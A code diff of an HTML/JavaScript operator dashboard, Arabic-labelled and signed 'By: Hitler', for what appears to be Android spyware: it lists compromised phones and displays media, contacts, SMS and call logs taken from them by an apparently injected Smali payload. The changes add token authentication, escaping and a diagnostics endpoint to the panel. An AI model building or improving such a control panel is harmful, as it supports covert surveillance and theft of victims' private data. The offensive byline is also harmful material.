@@ -3,48 +3,158 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SPECTER-7 — Full Dark Hacker Control Panel</title>
+
+<title>SPECTER-7 — Dark Hacker Control Panel</title>
+
 <style>
+/* =========================================================
+   SPECTER-7 // DARK CONTROL PANEL
+   ========================================================= */
+
 :root {
     --bg: #030506;
+    --bg2: #06090b;
     --panel: #080d0f;
+    --panel2: #0b1214;
     --border: rgba(255,255,255,.07);
     --green: #00ff88;
+    --green-soft: rgba(0,255,136,.12);
     --blue: #00aaff;
+    --blue-soft: rgba(0,170,255,.12);
     --red: #ff174f;
+    --red-soft: rgba(255,23,79,.12);
     --text: #e7f5f0;
     --muted: #71847f;
+    --muted2: #465650;
 }
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { background: var(--bg); color: var(--text); font-family: "Segoe UI", Tahoma, sans-serif; min-height: 100vh; }
-header {
-    height: 68px; display: flex; align-items: center; justify-content: space-between; padding: 0 28px;
-    background: rgba(5,8,10,.94); border-bottom: 1px solid rgba(0,255,136,.10); position: sticky; top: 0; z-index: 50;
-}
-h1 { font-family: "Courier New", monospace; font-size: 17px; color: var(--green); font-weight: 800; }
-.header-actions { display: flex; gap: 9px; }
-button { height: 36px; padding: 0 15px; border-radius: 6px; cursor: pointer; font-size: 12px; }
-.btn-danger { background: rgba(255,23,79,.055); border: 1px solid rgba(255,23,79,.35); color: var(--red); }
-.logout { background: rgba(255,255,255,.02); border: 1px solid rgba(255,255,255,.10); color: var(--muted); }
 
-main { max-width: 1600px; margin: 0 auto; padding: 22px 24px; }
-.grid-layout { display: grid; grid-template-columns: 270px 290px minmax(0,1fr); gap: 14px; align-items: start; }
-.box-card, .content-viewer { background: var(--panel); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; }
-.box-title { height: 48px; display: flex; align-items: center; padding: 0 16px; background: rgba(0,255,136,.045); border-bottom: 1px solid var(--border); color: var(--green); font-family: "Courier New", monospace; font-size: 11px; font-weight: 700; }
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html { min-height: 100%; }
+body {
+    min-height: 100vh;
+    background: var(--bg);
+    color: var(--text);
+    font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+    overflow-x: hidden;
+}
+
+header {
+    position: sticky;
+    top: 0;
+    height: 68px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 28px;
+    background: rgba(5,8,10,.94);
+    border-bottom: 1px solid rgba(0,255,136,.10);
+    backdrop-filter: blur(15px);
+    z-index: 50;
+}
+
+h1 {
+    font-family: "Courier New", monospace;
+    font-size: 17px;
+    font-weight: 800;
+    letter-spacing: .10em;
+    color: var(--green);
+    text-shadow: 0 0 8px rgba(0,255,136,.35);
+}
+
+.header-actions { display: flex; align-items: center; gap: 9px; }
+.btn-danger, .logout {
+    height: 36px;
+    padding: 0 15px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 12px;
+    transition: .25s ease;
+}
+
+.btn-danger {
+    background: rgba(255,23,79,.055);
+    border: 1px solid rgba(255,23,79,.35);
+    color: var(--red);
+}
+
+.logout {
+    background: rgba(255,255,255,.02);
+    border: 1px solid rgba(255,255,255,.10);
+    color: var(--muted);
+}
+
+main { width: 100%; max-width: 1550px; margin: 0 auto; padding: 22px 24px 30px; }
+.grid-layout { display: grid; grid-template-columns: 270px 285px minmax(0,1fr); gap: 14px; align-items: start; }
+.box-card, .content-viewer {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 18px 45px rgba(0,0,0,.25);
+}
+
+.box-title {
+    height: 48px;
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    background: linear-gradient(90deg, rgba(0,255,136,.045), transparent);
+    border-bottom: 1px solid var(--border);
+    color: var(--green);
+    font-family: "Courier New", monospace;
+    font-size: 11px;
+    font-weight: 700;
+}
 
 #dev-list { max-height: calc(100vh - 150px); overflow-y: auto; }
-.device-item { min-height: 68px; display: flex; align-items: center; gap: 12px; padding: 10px 15px; border-bottom: 1px solid rgba(255,255,255,.045); cursor: pointer; }
-.device-item:hover, .device-item.active { background: rgba(0,255,136,.075); }
-.dot { width: 9px; height: 9px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); }
-.dev-name { font-family: "Courier New", monospace; font-size: 12px; font-weight: 700; margin-bottom: 4px; }
+.device-item {
+    min-height: 68px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 15px;
+    border-bottom: 1px solid rgba(255,255,255,.045);
+    cursor: pointer;
+    transition: background .25s ease;
+}
+.device-item:hover { background: rgba(0,255,136,.035); }
+.device-item.active { background: rgba(0,255,136,.075); }
+
+.dot { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; }
+.dot.online { background: var(--green); box-shadow: 0 0 8px var(--green); }
+.dot.offline { background: var(--red); }
+
+.dev-name { color: var(--text); font-family: "Courier New", monospace; font-size: 12px; font-weight: 700; margin-bottom: 4px; }
 .dev-meta { color: var(--muted); font-size: 10px; }
 
-#device-sub-menu { display: flex; flex-direction: column; max-height: calc(100vh - 150px); overflow-y: auto; }
-.sub-menu-item { min-height: 44px; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid rgba(255,255,255,.045); cursor: pointer; color: #9aa9a5; font-size: 12px; }
-.sub-menu-item:hover, .sub-menu-item.active { color: var(--blue); background: rgba(0,170,255,.09); font-weight: 700; }
+#device-sub-menu { display: flex; flex-direction: column; }
+.sub-menu-item {
+    min-height: 48px;
+    display: flex;
+    align-items: center;
+    padding: 0 15px;
+    border-bottom: 1px solid rgba(255,255,255,.045);
+    cursor: pointer;
+    color: #9aa9a5;
+    font-size: 12px;
+    transition: .25s ease;
+}
+.sub-menu-item:hover { color: var(--blue); background: rgba(0,170,255,.035); }
+.sub-menu-item.active { color: var(--blue); background: rgba(0,170,255,.09); font-weight: 700; }
 
 .content-viewer { min-height: calc(100vh - 113px); display: flex; flex-direction: column; }
-.content-header { min-height: 55px; display: flex; align-items: center; justify-content: space-between; padding: 0 18px; background: rgba(0,255,136,.045); border-bottom: 1px solid var(--border); color: var(--green); font-family: "Courier New", monospace; font-size: 11px; }
+.content-header {
+    min-height: 55px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 18px;
+    background: linear-gradient(90deg, rgba(0,255,136,.045), transparent);
+    border-bottom: 1px solid var(--border);
+    color: var(--green);
+    font-family: "Courier New", monospace;
+    font-size: 11px;
+}
 .content-body { flex: 1; padding: 20px; overflow-y: auto; max-height: calc(100vh - 168px); }
 
 table { width: 100%; border-collapse: collapse; border: 1px solid rgba(255,255,255,.055); border-radius: 8px; font-size: 12px; }
@@ -54,127 +164,195 @@ td { color: #b9c8c3; }
 
 .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(145px,1fr)); gap: 12px; }
 .media-box { background: #060a0c; border: 1px solid rgba(255,255,255,.07); border-radius: 8px; padding: 8px; text-align: center; }
-.media-box img { display: block; width: 100%; height: 115px; object-fit: cover; border-radius: 5px; margin-bottom: 7px; }
-.download-btn { display: inline-block; padding: 5px 10px; border: 1px solid rgba(0,255,136,.3); border-radius: 4px; background: rgba(0,255,136,.045); color: var(--green); text-decoration: none; font-size: 9px; }
-.empty { min-height: 280px; display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 10px; color: var(--muted); text-align: center; padding: 35px; }
+.media-box img { display: block; width: 100%; height: 115px; object-fit: cover; border-radius: 5px; margin-bottom: 7px; background: #030505; }
+.download-btn { display: inline-block; padding: 5px 10px; border: 1px solid rgba(0,255,136,.3); border-radius: 4px; background: rgba(0,255,136,.045); color: var(--green); text-decoration: none; font-size: 9px; font-family: "Courier New", monospace; }
+
+.empty { min-height: 280px; display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 10px; color: var(--muted); text-align: center; padding: 35px; font-size: 12px; }
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-thumb { background: rgba(0,255,136,.22); border-radius: 20px; }
 </style>
 </head>
+
 <body>
 
 <header>
     <h1>Dark Control//By: Hitler</h1>
     <div class="header-actions">
         <button class="btn-danger" onclick="deleteDevice()">🗑️ حذف الجهاز</button>
-        <button class="logout" onclick="sessionStorage.clear(); location.href='/login.html';">خروج</button>
+        <button class="logout" id="out">خروج</button>
     </div>
 </header>
 
 <main>
     <div class="grid-layout">
-        <!-- قائمة الأجهزة -->
+        <!-- الأجهزة -->
         <div class="box-card">
             <div class="box-title">الأجهزة المتصلة</div>
             <div id="dev-list"></div>
         </div>
 
-        <!-- الأقسام الكاملة (القديمة والحديثة) -->
+        <!-- الأقسام (تم مطابقتها مع ملفات السيرفر والسمالي) -->
         <div class="box-card">
             <div class="box-title">قائمة تحكم الجهاز</div>
             <div id="device-sub-menu">
                 <div class="sub-menu-item active" data-section="overview">📊 معلومات الهاتف</div>
-                <div class="sub-menu-item" data-section="camera">📷 كاميرا الهاتف (DCIM)</div>
-                <div class="sub-menu-item" data-section="whatsapp">💬 واتساب (Android/media)</div>
-                <div class="sub-menu-item" data-section="screenshots">🖼️ لقطات الشاشة (Screenshots)</div>
+                <div class="sub-menu-item" data-section="media">📁 وسائط المجلدات (Media)</div>
                 <div class="sub-menu-item" data-section="contacts">👥 جهات الاتصال</div>
-                <div class="sub-menu-item" data-section="messages">✉️ الرسائل القصيرة</div>
+                <div class="sub-menu-item" data-section="messages">💬 الرسائل القصيرة</div>
                 <div class="sub-menu-item" data-section="calls">📞 سجل المكالمات</div>
-                <div class="sub-menu-item" data-section="location">🌍 الموقع الجغرافي</div>
-                <div class="sub-menu-item" data-section="network">🛜 نوع الشبكة والاتصال</div>
             </div>
         </div>
 
-        <!-- شاشة العرض -->
+        <!-- شاشة المحتوى -->
         <div class="content-viewer">
             <div class="content-header">
                 <span id="viewer-title">اختر جهازاً وقسماً لعرض المحتوى</span>
-                <span style="color:var(--green)">● متصل</span>
+                <span id="live-indicator" style="color:var(--green)">● جاهز</span>
             </div>
             <div class="content-body" id="viewer-content">
-                <div class="empty">الرجاء اختيار جهاز من القائمة اليمنى.</div>
+                <div class="empty">الرجاء اختيار جهاز من القائمة اليمنى لعرض البيانات هنا مباشرةً.</div>
             </div>
         </div>
     </div>
 </main>
 
 <script>
-const tk = sessionStorage.getItem("tk") || "bypass";
-let devices = [], selectedId = null, currentSection = "overview";
+const tk = sessionStorage.getItem("tk");
+if (!tk) location.href = "/login.html";
+
+document.getElementById("out").onclick = () => {
+    sessionStorage.clear();
+    location.href = "/login.html";
+};
+
+const esc = (s) => String(s || "").replace(/[&<>"']/g, c => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+}[c]));
+
+let devices = [];
+let selectedId = null;
+let currentSection = "overview";
 
 async function fetchDevices() {
     try {
-        const res = await fetch("/api/devices");
+        const res = await fetch("/api/devices", {
+            headers: { Authorization: "Bearer " + tk }
+        });
+        if (res.status === 401) {
+            sessionStorage.clear();
+            location.href = "/login.html";
+            return;
+        }
         const data = await res.json();
         devices = data.devices || [];
         renderDeviceList();
         if (selectedId) renderContent();
-    } catch (e) { console.error(e); }
+    } catch (e) {
+        console.error(e);
+    }
 }
 
 function renderDeviceList() {
     const el = document.getElementById("dev-list");
-    if (!devices.length) { el.innerHTML = '<div class="empty">لا توجد أجهزة متصلة</div>'; return; }
+    if (!devices.length) {
+        el.innerHTML = '<div class="empty">لا توجد أجهزة متصلة</div>';
+        return;
+    }
     el.innerHTML = devices.map(d => `
-        <div class="device-item ${d.id === selectedId ? "active" : ""}" onclick="selectDevice('${d.id}')">
-            <div class="dot"></div>
+        <div class="device-item ${d.id === selectedId ? "active" : ""}" data-id="${esc(d.id)}">
+            <div class="dot ${d.status || 'online'}"></div>
             <div>
-                <div class="dev-name">${d.id}</div>
-                <div class="dev-meta">${d.model || "غير معروف"}</div>
+                <div class="dev-name">${esc(d.id)}</div>
+                <div class="dev-meta">${esc(d.model || "غير معروف")}</div>
             </div>
         </div>
     `).join("");
-}
 
-window.selectDevice = (id) => { selectedId = id; renderDeviceList(); renderContent(); };
+    el.querySelectorAll(".device-item").forEach(div => {
+        div.onclick = () => {
+            selectedId = div.dataset.id;
+            renderDeviceList();
+            renderContent();
+        };
+    });
+}
 
 async function renderContent() {
     const dev = devices.find(d => d.id === selectedId);
-    const title = document.getElementById("viewer-title");
+    const viewerTitle = document.getElementById("viewer-title");
     const container = document.getElementById("viewer-content");
 
-    if (!dev) { title.textContent = "اختر جهازاً أولاً"; container.innerHTML = '<div class="empty">حدد جهازاً لعرض البيانات.</div>'; return; }
-    title.textContent = `جهاز: ${dev.id} // قسم: ${currentSection}`;
+    if (!dev) {
+        viewerTitle.textContent = "اختر جهازاً وقسماً لعرض المحتوى";
+        container.innerHTML = '<div class="empty">الرجاء تحديد جهاز أولاً.</div>';
+        return;
+    }
+
+    viewerTitle.textContent = `جهاز: ${esc(dev.id)} // قسم: ${currentSection}`;
 
     if (currentSection === "overview") {
         container.innerHTML = `
             <table>
-                <tr><th>المعلومة</th><th>القيمة</th></tr>
-                <tr><td>معرف الجهاز</td><td>${dev.id}</td></tr>
-                <tr><td>الطراز</td><td>${dev.model}</td></tr>
-                <tr><td>إصدار النظام</td><td>${dev.osVersion}</td></tr>
-                <tr><td>البطارية</td><td>${dev.battery}%</td></tr>
-            </table>`;
+                <tr><th>المعلومة التقنية</th><th>القيمة من الجهاز</th></tr>
+                <tr><td>معرف الجهاز (ID)</td><td>${esc(dev.id)}</td></tr>
+                <tr><td>حالة الاتصال</td><td><span class="badge">${esc(dev.status || 'online')}</span></td></tr>
+                <tr><td>الطراز (Model)</td><td>${esc(dev.model || "—")}</td></tr>
+                <tr><td>إصدار الأندرويد</td><td>${esc(dev.osVersion || "—")}</td></tr>
+                <tr><td>نسبة البطارية</td><td><b>${dev.battery || 0}%</b></td></tr>
+            </table>
+        `;
         return;
     }
 
-    const diag = dev.diagnostics?.[currentSection];
-    if (!diag || !diag.items?.length) {
-        container.innerHTML = `<div class="empty">لا توجد بيانات متاحة في قسم (${currentSection}) حالياً.</div>`;
-        return;
-    }
+    try {
+        container.innerHTML = '<div class="empty" style="color:var(--blue)">جاري سحب المحتوى من السيرفر...</div>';
 
-    if (["camera", "whatsapp", "screenshots"].includes(currentSection)) {
-        container.innerHTML = `<div class="media-grid">${diag.items.map(img => `
-            <div class="media-box">
-                <img src="${img}" onerror="this.style.display='none'">
-                <a href="${img}" target="_blank" download class="download-btn">📥 تحميل</a>
-            </div>`).join("")}</div>`;
-    } else {
-        container.innerHTML = `<table><tr><th>#</th><th>المحتوى</th></tr>${diag.items.map((it, i) => `<tr><td>${i+1}</td><td>${it}</td></tr>`).join("")}</table>`;
+        const res = await fetch("/api/diagnostics/" + encodeURIComponent(selectedId), {
+            headers: { Authorization: "Bearer " + tk }
+        });
+        const data = await res.json();
+        const diag = data.diagnostics?.[currentSection];
+
+        if (!diag || !diag.items?.length) {
+            container.innerHTML = `<div class="empty">لا توجد بيانات متاحة في قسم (${currentSection}) لهذا الجهاز.</div>`;
+            return;
+        }
+
+        // إذا كان القسم هو media (الصور والملفات التي يرسلها الـ Smali)
+        if (currentSection === "media") {
+            container.innerHTML = `
+                <div class="media-grid">
+                    ${diag.items.map(img => `
+                        <div class="media-box">
+                            <img src="${esc(img)}" alt="Media" onerror="this.style.display='none'">
+                            <a href="${esc(img)}" target="_blank" download class="download-btn">📥 تحميل الملف</a>
+                        </div>
+                    `).join("")}
+                </div>
+            `;
+        } else {
+            container.innerHTML = `
+                <table>
+                    <tr><th>#</th><th>محتوى البيانات المسحوبة</th><th>الحالة</th></tr>
+                    ${diag.items.map((item, i) => `
+                        <tr>
+                            <td>${i + 1}</td>
+                            <td>${esc(item)}</td>
+                            <td style="color:var(--green)">متزامن</td>
+                        </tr>
+                    `).join("")}
+                </table>
+            `;
+        }
+    } catch (e) {
+        console.error(e);
+        container.innerHTML = '<div class="empty" style="color:var(--red)">فشل جلب بيانات القسم من الخادم</div>';
     }
 }
 
 document.querySelectorAll(".sub-menu-item").forEach(item => {
     item.onclick = () => {
+        document.querySelectorAll(".sub-menu-item").items?.forEach?.(i => i.classList.remove("active"));
         document.querySelectorAll(".sub-menu-item").forEach(i => i.classList.remove("active"));
         item.classList.add("active");
         currentSection = item.dataset.section;
@@ -183,16 +361,29 @@ document.querySelectorAll(".sub-menu-item").forEach(item => {
 });
 
 async function deleteDevice() {
-    if (!selectedId) { alert("اختر جهازاً أولاً."); return; }
-    if (!confirm(`حذف الجهاز ${selectedId}؟`)) return;
-    await fetch("/api/devices/" + selectedId, { method: "DELETE" });
-    selectedId = null;
-    fetchDevices();
-    document.getElementById("viewer-content").innerHTML = '<div class="empty">تم الحذف.</div>';
+    if (!selectedId) { alert("اختر جهازاً أولاً لحذفه."); return; }
+    if (!confirm(`هل أنت متأكد من حذف الجهاز (${selectedId}) نهائياً؟`)) return;
+
+    try {
+        const res = await fetch("/api/devices/" + encodeURIComponent(selectedId), {
+            method: "DELETE",
+            headers: { Authorization: "Bearer " + tk }
+        });
+        if (res.ok) {
+            selectedId = null;
+            fetchDevices();
+            document.getElementById("viewer-content").innerHTML = '<div class="empty">تم حذف الجهاز بنجاح.</div>';
+        } else {
+            alert("فشل الحذف من السيرفر (تأكد من دعم السيرفر لطلب DELETE).");
+        }
+    } catch (e) {
+        alert("خطأ في الاتصال.");
+    }
 }
 
-setInterval(fetchDevices, 4000);
+setInterval(fetchDevices, 5000);
 fetchDevices();
 </script>
+
 </body>
 </html>
